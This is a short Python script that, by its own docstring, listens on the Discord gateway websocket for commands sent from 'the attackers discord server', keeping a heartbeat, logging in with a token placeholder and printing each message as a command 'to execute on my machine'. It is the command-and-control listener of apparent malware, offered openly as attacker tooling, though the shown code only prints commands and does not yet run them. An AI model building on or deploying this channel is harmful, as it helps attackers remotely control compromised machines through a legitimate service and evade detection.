"""
    Description: The discord websocket connection is used to listen on commands
                 from the attackers discord server. WSS is usefull because the
                 messages are received in real time.
"""
import websocket
import threading
import time
import json

TOKEN = "TOKEN"
URL = "wss://gateway.discord.gg/?v=9&encording=json"

def send_json_request(ws, request) -> None:
    ws.send(json.dumps(request))

def recieve_json_response(ws):
    response = ws.recv()
    if response:
        return json.loads(response)

def heartbeat(interval, ws):
    print("Heatbeat has begun")
    while True:
        time.sleep(interval)
        heatbeatJSON = {
                "op": 1,
                "d": "null"
        }

        send_json_request(ws, heatbeatJSON)
        print("Heartbeat has been send")

def main() -> None:
    ws = websocket.WebSocket()
    ws.connect(URL)
    event = recieve_json_response(ws)

    heartbeat_interval = event['d']['heartbeat_interval'] / 1000
    threading._start_new_thread(heartbeat, (heartbeat_interval, ws))

    payload = {
        "op": 2,
        "d": {
            "token": TOKEN,
            "properties": {
                "$os": "linux",
                "$browser": "other",
                "$device": "pc" 
            } 
        }
    }

    send_json_request(ws, payload)

    while True:
        event = recieve_json_response(ws)

        if event['t'] == 'MESSAGE_CREATE':
            message_content = event['d']['content']
            print(f"Command To Execute On My Machine: {message_content}")

if __name__ == '__main__':
    main()
